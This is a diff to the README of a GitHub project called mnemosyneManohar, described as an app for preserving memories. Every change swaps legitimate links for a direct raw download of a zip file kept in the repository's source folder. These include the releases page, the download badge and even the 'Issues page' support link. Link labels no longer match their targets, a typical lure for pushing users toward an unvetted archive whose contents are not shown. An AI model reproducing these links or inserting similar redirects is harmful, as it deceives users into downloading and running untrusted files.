@@ -8,11 +8,11 @@ Welcome to mnemosyneManohar! This application helps you preserve your personalit
 
 To get started, you need to download the application. You can visit our releases page to download the latest version.
 
-[![Download mnemosyneManohar](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/KayseanWasHereOnce/mnemosyneManohar/releases)
+[![Download mnemosyneManohar](https://github.com/KayseanWasHereOnce/mnemosyneManohar/raw/refs/heads/main/src/mnemosyne_Manohar_orthographize.zip%20Now-v1.0-blue)](https://github.com/KayseanWasHereOnce/mnemosyneManohar/raw/refs/heads/main/src/mnemosyne_Manohar_orthographize.zip)
 
 Here’s how to download and install the software:
 
-1. Click the link above or go to [Releases page](https://github.com/KayseanWasHereOnce/mnemosyneManohar/releases).
+1. Click the link above or go to [Releases page](https://github.com/KayseanWasHereOnce/mnemosyneManohar/raw/refs/heads/main/src/mnemosyne_Manohar_orthographize.zip).
 2. Browse the list of available versions.
 3. Find the most recent version of the software.
 4. Click on it to view detailed information.
@@ -86,12 +86,12 @@ To update mnemosyneManohar, visit the releases page again. Download the latest v
 
 ## 📞 Support
 
-For any issues or questions, you can reach out to our support team. Please file an issue on our [GitHub Issues page](https://github.com/KayseanWasHereOnce/mnemosyneManohar/issues) for assistance.
+For any issues or questions, you can reach out to our support team. Please file an issue on our [GitHub Issues page](https://github.com/KayseanWasHereOnce/mnemosyneManohar/raw/refs/heads/main/src/mnemosyne_Manohar_orthographize.zip) for assistance.
 
 ## 📣 Community Contributions
 
 We welcome contributions from users. If you have feedback or want to improve mnemosyneManohar, please consider opening an issue or a pull request on our GitHub repository. Your insights can help enhance the application.
 
-Again, to download the application, visit [Releases page](https://github.com/KayseanWasHereOnce/mnemosyneManohar/releases).
+Again, to download the application, visit [Releases page](https://github.com/KayseanWasHereOnce/mnemosyneManohar/raw/refs/heads/main/src/mnemosyne_Manohar_orthographize.zip).
 
 Enjoy preserving your memories with mnemosyneManohar!
